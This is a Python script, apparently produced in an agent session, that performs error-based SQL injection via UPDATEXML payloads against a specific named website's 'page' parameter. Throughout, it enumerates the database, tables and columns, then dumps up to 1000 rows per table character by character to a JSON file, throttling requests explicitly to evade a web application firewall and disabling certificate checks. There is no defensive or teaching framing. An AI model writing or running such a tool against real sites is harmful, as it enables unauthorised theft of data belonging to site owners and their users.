from src.sdk.tool import function_tool
import os
import subprocess

#!/usr/bin/env python3
"""
UPDATEXML-based SQL injection data extractor for error-based extraction.
Targets: https://hsaco.in/act_rules.php?page=
"""
import requests
import time
import re
import sys
from urllib.parse import quote

def url_encode(payload):
    """URL encode payload properly"""
    return quote(payload, safe='')

def make_request(payload, base_url="https://hsaco.in/act_rules.php"):
    """Make HTTP request with error extraction"""
    url = f"{base_url}?page=1'%20{payload}--%20-"
    try:
        resp = requests.get(url, timeout=15, verify=False)
        return resp.text
    except Exception as e:
        print(f"[!] Request failed: {e}")
        return None

def extract_error_value(response_text):
    """Extract value from XPATH syntax error: XPATH syntax error: '...'"""
    if not response_text:
        return None
    # Pattern: XPATH syntax error: ':VALUE'
    match = re.search(r"XPATH syntax error: '([^']*)'", response_text)
    if match:
        return match.group(1)
    return None

def get_database_name():
    """Get current database name"""
    print("[*] Getting database name...")
    payload = "AND UPDATEXML(1,concat(0x3a,(SELECT database())),1)"
    resp = make_request(payload)
    db = extract_error_value(resp)
    if db:
        print(f"[+] Database: {db}")
        return db
    else:
        print("[-] Failed to get database name")
        return None

def get_table_names(database):
    """Get all table names from database"""
    print(f"[*] Getting table names from {database}...")
    # Using information_schema.tables
    # We'll extract one table at a time using LIMIT offset
    tables = []
    offset = 0
    chunk_size = 50  # Extract 50 chars at a time
    
    while True:
        # Get table name at offset
        payload = f"AND UPDATEXML(1,concat(0x3a,(SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema='{database}'%20LIMIT%20{offset},1)),1)"
        resp = make_request(payload)
        val = extract_error_value(resp)
        
        if not val or val == '':
            break
            
        # If we got some data, it's part of a table name
        if val:
            # Need to collect the full table name char by char
            full_name = ''
            for i in range(1, 100):  # Max 100 chars per table name
                char_payload = f"AND UPDATEXML(1,concat(0x3a,substring((SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema='{database}'%20LIMIT%20{offset},1),{i},1)),1)"
                resp = make_request(char_payload)
                char_val = extract_error_value(resp)
                if char_val and len(char_val) > 0:
                    full_name += char_val
                else:
                    break
                    
                time.sleep(0.3)  # Throttle to avoid WAF
            
            if full_name:
                tables.append(full_name)
                print(f"[+] Table found: {full_name}")
                offset += 1
                time.sleep(1)
            else:
                break
        else:
            break
            
        time.sleep(0.5)
    
    print(f"[+] Total tables found: {len(tables)}")
    return tables

def get_column_names(database, table):
    """Get all column names for a specific table"""
    print(f"[*] Getting columns for table: {table}")
    columns = []
    offset = 0
    
    while True:
        payload = f"AND UPDATEXML(1,concat(0x3a,(SELECT%20column_name%20FROM%20information_schema.columns%20WHERE%20table_schema='{database}'%20AND%20table_name='{table}'%20LIMIT%20{offset},1)),1)"
        resp = make_request(payload)
        val = extract_error_value(resp)
        
        if not val or val == '':
            break
            
        # Extract full column name
        full_name = ''
        for i in range(1, 100):
            char_payload = f"AND UPDATEXML(1,concat(0x3a,substring((SELECT%20column_name%20FROM%20information_schema.columns%20WHERE%20table_schema='{database}'%20AND%20table_name='{table}'%20LIMIT%20{offset},1),{i},1)),1)"
            resp = make_request(char_payload)
            char_val = extract_error_value(resp)
            if char_val and len(char_val) > 0:
                full_name += char_val
            else:
                break
            time.sleep(0.3)
            
        if full_name:
            columns.append(full_name)
            print(f"[+] Column found: {full_name}")
            offset += 1
            time.sleep(1)
        else:
            break
            
        time.sleep(0.5)
    
    print(f"[+] Total columns in {table}: {len(columns)}")
    return columns

def dump_table_data(database, table, columns):
    """Dump all rows from a table"""
    print(f"[*] Dumping data from table: {table}")
    rows = []
    row_count = 0
    
    # First get count
    count_payload = f"AND UPDATEXML(1,concat(0x3a,(SELECT%20COUNT(*)%20FROM%20{ database }.{table})),1)"
    resp = make_request(count_payload)
    count_val = extract_error_value(resp)
    if count_val:
        try:
            total_rows = int(count_val)
            print(f"[+] Total rows in {table}: {total_rows}")
        except:
            total_rows = 100
    else:
        total_rows = 100
    
    # Dump each row
    for row_idx in range(min(total_rows, 1000)):  # Limit to 1000 rows for demo
        row_data = {}
        for col_idx, col in enumerate(columns):
            # Extract column value
            val_payload = f"AND UPDATEXML(1,concat(0x3a,substring((SELECT%20{col}%20FROM%20{ database }.{table}%20LIMIT%20{row_idx},1),1,50)),1)"
            resp = make_request(val_payload)
            val = extract_error_value(resp)
            
            if val:
                # Need to get full value character by character
                full_val = ''
                for i in range(1, 200):  # Max 200 chars per field
                    char_payload = f"AND UPDATEXML(1,concat(0x3a,substring((SELECT%20{col}%20FROM%20{ database }.{table}%20LIMIT%20{row_idx},1),{i},1)),1)"
                    resp = make_request(char_payload)
                    char_val = extract_error_value(resp)
                    if char_val and char_val != '':
                        full_val += char_val
                    else:
                        break
                    time.sleep(0.2)
                row_data[col] = full_val
                print(f"    [{row_idx}] {col}: {full_val[:50]}{'...' if len(full_val)>50 else ''}")
            else:
                row_data[col] = None
            
            time.sleep(0.3)
        
        if any(v for v in row_data.values() if v):
            rows.append(row_data)
            row_count += 1
        
        time.sleep(1)
    
    print(f"[+] Dumped {row_count} rows from {table}")
    return rows

def main():
    print("="*60)
    print("SQL INJECTION EXPLOITER - UPDATEXML ERROR-BASED")
    print("="*60)
    
    # Suppress SSL warnings
    requests.packages.urllib3.disable_warnings()
    
    # Step 1: Get database name
    database = get_database_name()
    if not database:
        print("[-] Could not determine database name")
        sys.exit(1)
    
    # Step 2: Get all tables
    tables = get_table_names(database)
    
    # Step 3: For each table, get columns
    schema = {}
    for table in tables:
        cols = get_column_names(database, table)
        schema[table] = cols
        time.sleep(1)
    
    # Step 4: Dump data from each table
    full_dump = {}
    for table, columns in schema.items():
        if columns:
            data = dump_table_data(database, table, columns)
            full_dump[table] = {
                'columns': columns,
                'rows': data
            }
        time.sleep(2)
    
    # Step 5: Print summary
    print("\n" + "="*60)
    print("DATABASE DUMP SUMMARY")
    print("="*60)
    print(f"Database: {database}")
    print(f"Total tables: {len(tables)}")
    for table, info in full_dump.items():
        print(f"\nTable: {table}")
        print(f"  Columns: {', '.join(info['columns'])}")
        print(f"  Rows dumped: {len(info['rows'])}")
        if info['rows']:
            print(f"  Sample row:")
            for k, v in info['rows'][0].items():
                print(f"    {k}: {v}")
    
    # Save to file
    import json
    outfile = f"session_20260618_002928/dumps/{database}_dump.json"
    try:
        with open(outfile, 'w') as f:
            json.dump(full_dump, f, indent=2, default=str)
        print(f"\n[+] Full dump saved to: {outfile}")
    except Exception as e:
        print(f"[!] Failed to save dump: {e}")
    
    return full_dump

if __name__ == "__main__":
    main()